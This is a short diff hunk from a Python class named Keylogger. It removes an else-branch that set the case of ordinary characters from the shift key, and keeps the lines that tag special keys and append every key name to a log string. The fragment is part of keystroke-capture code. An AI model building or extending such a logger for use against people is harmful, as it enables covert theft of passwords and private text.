@@ -43,12 +43,6 @@ class Keylogger:
                 # replace spaces with underscores
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
-        else:
-            # normal character, check for shift to get correct case
-            if 'shift' in event.modifiers:
-                name = name.upper()
-            else:
-                name = name.lower()
         # finally, add the key name to our global `self.log` variable
         self.log += name
 
